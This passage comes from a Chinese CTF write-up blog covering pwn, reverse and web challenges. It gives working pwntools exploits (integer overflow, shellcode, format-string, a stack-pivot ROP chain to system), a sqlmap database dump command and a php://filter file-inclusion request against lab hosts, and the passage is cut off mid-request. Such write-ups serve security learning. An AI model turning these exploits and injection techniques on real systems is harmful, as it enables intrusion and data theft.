ret</span></h3><p><img src="1667124080447.png" alt></p><p>利用nbytes-v2来溢出，v2是%u格式，也就是无符号十进制数。<img src="1667124268241.png" alt></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#4294967224</span><br><span class="line">p = process(&#x27;./uint&#x27;)</span><br><span class="line">p.recvuntil(b&#x27;success!&#x27;)</span><br><span class="line">payload1 = str(4294967224).encode()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">backdoor = 0x4011B6</span><br><span class="line">ret = 0x40101a</span><br><span class="line">payload2 = b&#x27;a&#x27; * 0x50 + b&#x27;b&#x27; * 0x8 + p64(ret) + p64(backdoor)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果不加ret的话，应该会出现<a href="https://blog.csdn.net/fjh1997/article/details/105755222">这种情况</a>。</p><h3><span id="shellcode-revenge">shellcode-revenge</span></h3><p>提示给的很好： 我要创造一个 read 字节数足够的世界 </p><p><img src="1667441274527.png" alt="1667441274527"></p><p>有两个输入，第一个输入只有0x1A个字符输入，构成不了可用的shellcode，输入地址是0x233000。所以，第一个read应该构造buf(0x233000)上面的shellcode，再实现一次read输入，这个用的长度比较短。第二个read构造栈溢出，使得return的地址执行0x233000上的shellcode。其他问题请看注释。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode = shellcraft.read(<span class="number">0</span>, <span class="number">0x233019</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode = asm(shellcode) + <span class="string">b&#x27;\x90\x90\x90\x90&#x27;</span></span><br><span class="line"><span class="comment">#这是read语句的shellcode，在0x233019地址上输入0x100个字符。在第一个read的地方输入这个shellcode。</span></span><br><span class="line"><span class="comment">#\x90就是nop，这句不执行。如果没有这个\x90需要计算shellcode的长度，以免覆盖错误，这几个增加了容错。</span></span><br><span class="line"></span><br><span class="line">code = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">code += shellcraft.read(<span class="number">3</span>, <span class="number">0x233200</span>, <span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.write(<span class="number">1</span>, <span class="number">0x233200</span>, <span class="number">0x50</span>)</span><br><span class="line">code = asm(code)</span><br><span class="line"><span class="comment">#这是直接读取flag的内容。这个道题flag在程序目录下。作为第三个read的输入。</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x233000</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;~&#x27;</span>)</span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">b&#x27;a&#x27;</span> + <span class="number">8</span> * <span class="string">b&#x27;b&#x27;</span> + p64(backdoor)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(code)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="砍一刀">砍一刀</span></h3><p>这道题真实复刻了砍某厂商优惠的过程，做起来是挺蛋疼的。格式化字符串漏洞，附上大佬师傅讲解的地址：<a href="https://blog.csdn.net/A951860555/article/details/115061803">CTF pwn题之格式化字符串漏洞详解</a> 。里面的payload很有用。不过后面还有一道题，可以更细致的讲讲，这道题做起来确实太烦了，主要是文字太多，我的wsl并不能识别中文，所以推荐去虚拟机实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#game</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n&#x27;))</span><br><span class="line"></span><br><span class="line">#cipher</span><br><span class="line">print(p.recvuntil(b&#x27;==&gt;&#x27;))</span><br><span class="line">p.sendline(b&#x27;666&#x27;)</span><br><span class="line"></span><br><span class="line">#game</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line"></span><br><span class="line">p.sendline(b&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line"></span><br><span class="line">#getcard</span><br><span class="line">print(p.recvuntil(b&#x27;\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">while True:</span><br><span class="line">print(p.recvuntil(b&#x27;\n&#x27;))</span><br><span class="line">p.sendline(b&#x27;&#x27;)</span><br><span class="line">print(p.recvuntil(b&#x27;!&#x27;))</span><br><span class="line">tmp = p.recvuntil(b&#x27;\n&#x27;)</span><br><span class="line">if b&#x27;=&#x27; in tmp:</span><br><span class="line">break</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n&#x27;))</span><br><span class="line">print(&quot;arrive getdiamond&quot;)</span><br><span class="line"></span><br><span class="line">#diamond</span><br><span class="line">print(p.recvuntil(b&#x27;\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n&#x27;))</span><br><span class="line">print(p.recvuntil(b&#x27;\n\n&#x27;))</span><br><span class="line">while True:</span><br><span class="line">tmp = p.recvuntil(b&#x27;\n&#x27;)</span><br><span class="line">if b&#x27;=&#x27; in tmp:</span><br><span class="line">print(&quot;sucess!&quot;)</span><br><span class="line">break</span><br><span class="line">p.sendline(b&#x27;&#x27;)</span><br><span class="line">print(p.recvuntil(b&#x27;!&#x27;))</span><br><span class="line"></span><br><span class="line">tmp = p.recvuntil(b&#x27;\n&#x27;)</span><br><span class="line">if b&#x27;=&#x27; in tmp:</span><br><span class="line">print(p.recvuntil(b&quot;==&gt;&quot;))</span><br><span class="line">payload = fmtstr_payload(8, &#123;0x404090:10&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="buffer-fly">buffer-fly</span></h3><p><img src="1667808586427.png" alt></p><p>buf并没有初始化，所以存在一些我们需要的值。</p><p><img src="1667815520093.png" alt></p><p>因为printf打印到\x0，所以可以尝试把这两个地址上面的值泄露出来。程序基地址是0x55555555528b - 0x128b。rbp存储的地址是0x7fffffffdf40 - 0x10。最后一个read只有0x40个字符输入所以直接system地址并不够用。那么只能尝试下栈迁移。上大佬得讲解：<a href="https://blog.csdn.net/qq_43409582/article/details/109991230">栈迁移浅析</a> ： <strong>我们知道程序在结束的时候本身就会执行一次leave ret如果我们把ebp换成我们想迁移的地址，那么在执行leava ret的时候首先会mov esp ebp;这时的esp会指向当前栈的基地址，再执行pop ebp，如果之前我们通过栈溢出将ebp改成了我们想要迁移的地址即bss段，这时执行完pop ebp;之后就会使得ebp指向bss段的地址。</strong> 这道题我们不需要bss段也能完成。</p><p>原理是覆盖ebp指向图中rsp上一个的地址。也就是0x7fffffffdf40 - 0x38。然后经过返回地址leave和ret后，我们eip指向了途中rsp的地址，0x7fffffffdf10。如果这时，写入的值为pop_rdi_ret, 0x7fffffffdf40，system_addr，就可以执行0x7fffffffdf40上我们输入的值了。最后这道题还有个坑，不能直接输出cat flag，所以可以用sh flag或者cat flag &gt;&amp;2。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line">p = process(&#x27;./buffer_fly&#x27;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;give me your name: &quot;)</span><br><span class="line">p.send(b&#x27;a&#x27; * 0x18)</span><br><span class="line">p.recvuntil(b&#x27;a&#x27; * 0x18)</span><br><span class="line">program_leak = p.recvuntil(b&#x27;\n&#x27;)[:-1]</span><br><span class="line">program_leak = u64(program_leak.ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">program_base = program_leak - 0x00128b</span><br><span class="line">print(hex(program_base))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = program_base + 0x001423</span><br><span class="line">system_addr = program_base + 0x0010E4</span><br><span class="line">leave_ret = program_base + 0x001397</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;give me your age: &quot;)</span><br><span class="line">p.send(b&quot;a&quot; * 0x20)</span><br><span class="line">p.recvuntil(b&quot;a&quot; * 0x20)</span><br><span class="line">stack_leak = p.recvuntil(b&quot;\n&quot;)[:-1]</span><br><span class="line">stack_leak = u64(stack_leak.ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(stack_leak))</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;you are a girl ?\nsusu give me your wechat number: &quot;)</span><br><span class="line"></span><br><span class="line">cat_flag = b&quot;sh flag&quot; + b&#x27;\x00&#x27;</span><br><span class="line">payload = p64(pop_rdi_ret) + p64(stack_leak) + p64(system_addr) + p64(0) + p64(stack_leak - 0x38) + p64(leave_ret) + cat_flag</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="reverse">Reverse</span></h2><h3><span id="前可见古人后得见来者">前可见古人，后得见来者</span></h3><p>异或加凯撒：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">task = [0x51, 0x5B, 0x4C, 0x56, 0x59, 0x4D, 0x50, 0x56, 0x54, 0x43, 0x7D, 0x4C, 0x43, 0x53, 0x7D, 0x50, 0x43, 0x53, 0x7D, 0x47, 0x50, 0x7D, 0x4C, 0x43, 0x53, 0x7D, 0x4E, 0x40, 0x4A, 0x5F, 0x00]</span><br><span class="line">task = [i ^ 0x22 for i in task]</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in task:</span><br><span class="line">if i &lt; 65 or i &gt; 90:</span><br><span class="line">if i &gt;= 97 and i &lt;= 122:</span><br><span class="line">flag += chr((i - 13 - 97) % 0x1A + 97)</span><br><span class="line">else:</span><br><span class="line">flag += chr(i)</span><br><span class="line">else:</span><br><span class="line">flag += chr((i - 13 -65) % 0x1A + 65)</span><br><span class="line">print(flag)</span><br><span class="line">#flag&#123;begin_and_end_re_and_you&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="findme">FindME</span></h3><p>这题是用angr直接秒的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#001D10</span><br><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def Go():</span><br><span class="line">    path_to_binary = &quot;task_time&quot;</span><br><span class="line">    project = angr.Project(path_to_binary, auto_load_libs=False)</span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line">    #一般我会先查看程序起始地址，64位程序可能是0x400000，32位可能是0x800000</span><br><span class="line">    #print(project.entry)</span><br><span class="line">    print_good_address = 0x401D10</span><br><span class="line">    simulation.explore(find=print_good_address)</span><br><span class="line"></span><br><span class="line">    if simulation.found:</span><br><span class="line">        solution_state = simulation.found[0]</span><br><span class="line">        solution = solution_state.posix.dumps(sys.stdin.fileno()) # 大概意思是dump出输入</span><br><span class="line">        print(solution)</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&#x27;Could not find the solution&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    Go()</span><br><span class="line">    #path_to_binary = &quot;oruga&quot;</span><br><span class="line">    #project = angr.Project(path_to_binary, auto_load_libs=False)</span><br><span class="line">    #print(project.entry)</span><br><span class="line"></span><br><span class="line">#b&#x27;flag&#123;D0nt_let_time_bo_so_cheap!&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="petals">Petals</span></h3><p><img src="1667824299076.png" alt></p><p>这个地方有个花指令。在013B0处按u，然后ctrl+n。回到loc_1209按p。就可以F5了。然后直接逆就行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cipher = [0xD0, 0xD0, 0x85, 0x85, 0x80, 0x80, 0xC5, 0x8A, 0x93, 0x89, 0x92, 0x8F, 0x87, 0x88, 0x9F, 0x8F, 0xC5, 0x84, 0xD6, 0xD1, 0xD2, 0x82, 0xD3, 0xDE, 0x87]</span><br><span class="line">v5 = [~(i ^ 25) &amp; 0xff for i in range(256)]</span><br><span class="line">print(v5)</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(len(cipher)):</span><br><span class="line">for j in range(33, 127):</span><br><span class="line">tmp = chr(j)</span><br><span class="line">if v5[j] == cipher[i]:</span><br><span class="line">print(f&quot;i : %d - %c&quot;  %(i,tmp))</span><br><span class="line">flag += tmp</span><br><span class="line"></span><br><span class="line">print(len(flag))</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">import hashlib</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(flag.encode())</span><br><span class="line">print(md5.hexdigest())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="ur_so_naive">ur_so_naive</span></h3><p>exciting!</p><p><img src="1667825739578.png" alt></p><p>首先找到Activity。这里有疑似最后的加密结果this.o。还有个loadLibrary，那么从Libraries里面取出来libencry.so。</p><p><img src="1667826678350.png" alt></p><p>加密函数：</p><p><img src="1667826859932.png" alt></p><p>在原来的activity里面找到x1.a，打开，就可以看到逻辑了：</p><p><img src="1667826905583.png" alt></p><p><img src="1667826935264.png" alt></p><p>接着就是直接解了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">final = [-36, 83, 22, -117, -103, -14, 8, 19, -47, 0x2F, -110, 71, 2, -21, -52, -36, 24, -121, 87, -114, -121, 27, -113, -86]</span><br><span class="line">v7 = list(b&#x27;FALL&#x27;)</span><br><span class="line"></span><br><span class="line">def ROR(byte_, num):</span><br><span class="line">tmp = (byte_ &gt;&gt; num) | (byte_ &lt;&lt; (8 - num)) &amp; 0xff</span><br><span class="line">return tmp</span><br><span class="line"></span><br><span class="line">def ROL(byte_, num):</span><br><span class="line">tmp = (byte_ &lt;&lt; num &amp; 0xff) | (byte_ &gt;&gt; (8 - num)) </span><br><span class="line">return tmp</span><br><span class="line"></span><br><span class="line">def test(a, c):</span><br><span class="line">v9 = ROR(a, 1)</span><br><span class="line">v10 = ROL((v7[0] ^ v9) &amp; 0xff, 6)</span><br><span class="line">v11 = ROL((v7[1] ^ v10) &amp; 0xff , 5)</span><br><span class="line">v12 = ROL((v7[2] ^ v11) &amp; 0xff, 4)</span><br><span class="line">v13 = (v12 ^ v7[3]) &amp; 0xff</span><br><span class="line">return v13 ^ c</span><br><span class="line"></span><br><span class="line">flag = [ord(&#x27;f&#x27;)]</span><br><span class="line"></span><br><span class="line">for i in range(len(final)):</span><br><span class="line">for j in range(33, 127):</span><br><span class="line">if test(flag[i], j) == final[i] % 256:</span><br><span class="line">flag.append(j)</span><br><span class="line">break</span><br><span class="line"></span><br><span class="line">print(bytes(flag))</span><br><span class="line">#b&#x27;flag&#123;n@1ve_luv_2you#ouo&#125;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="likemyasp">Likemyasp</span></h3><p>这道题有个相似的脱壳介绍：<a href="https://blog.csdn.net/chunjiujun/article/details/120938000">x64dbg手脱壳</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cipher = [0x98, 0xC0, 0x1F, 0x3C, 0x80, 0x0D, 0x00, 0x00, 0x97, 0xC0, 0x0B, 0x36, 0x20, 0x0E, 0x00, 0x00, 0xA0, 0x00, 0x1C, 0x2A, 0xE0, 0x0F, 0x00, 0x00, 0xCB, 0x40, 0x10, 0x12, 0xA0, 0x0F, 0x00, 0x00, 0x92, 0x40, 0x10, 0x32, 0x20, 0x0F, 0x00, 0x00, 0x82, 0x40, 0x88, 0x15, 0x60, 0x0D]</span><br><span class="line"></span><br><span class="line">tt = [0x0D803C1FC098, 0x0E20360BC097, 0x0FE02A1C00A0, 0x0FA0121040CB, 0x0F2032104092, 0x0D6015884082]</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in tt:</span><br><span class="line">d = ~(i &amp; 0xff)</span><br><span class="line">c = ((i &gt;&gt; 14) &amp; 0xff) ^ 0x1E</span><br><span class="line">b = ((i &gt;&gt; 23) &amp; 0xff) ^ 0x14</span><br><span class="line">a = ((i &gt;&gt; 37) &amp; 0xff) ^ 0xA</span><br><span class="line">#print(a , b, c, d % 256)</span><br><span class="line">flag += (chr(a) + chr(b) + chr(c) + chr(d % 256))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line">#flag&#123;x1hu@n_w0_4sp_ma??&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="web">web</span></h2><p>我的web还很菜，这位师傅给了详细的wp：<a href="https://blog.csdn.net/trytowritecode/article/details/127058676">七校联合NewStarCTF 公开赛赛道WEEK2 web wp</a></p><h3><span id="word-for-you2-gen">Word-For-You(2 Gen)</span></h3><p><strong>sqlmap </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /comments.php HTTP/1.1</span><br><span class="line">Host: 90176c4f-e0a6-4c63-ae31-fa60d6e6a470.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 6</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://90176c4f-e0a6-4c63-ae31-fa60d6e6a470.node4.buuoj.cn:81</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://90176c4f-e0a6-4c63-ae31-fa60d6e6a470.node4.buuoj.cn:81/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">name=1</span><br><span class="line">#post.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r post.txt -D <span class="string">&#x27;wfy&#x27;</span> -T <span class="string">&#x27;wfy_comments&#x27;</span> --dump --level=5 --fresh-queries --delay 0.1 &gt; sqlmap.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="includeone">IncludeOne</span></h3><p>提示给了方法：</p><p><img src="1667828004506.png" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1145146</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#1219893521\n1202031004</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后用rot13绕过一下就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /?file=php://filter/NewStar/read=string.rot13/resource=flag.php HTTP/1.1</span><br><span class="line">Host: df77d66c-2711-420c-9b08-702dd925b971.node4.buuoj.cn:81</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: 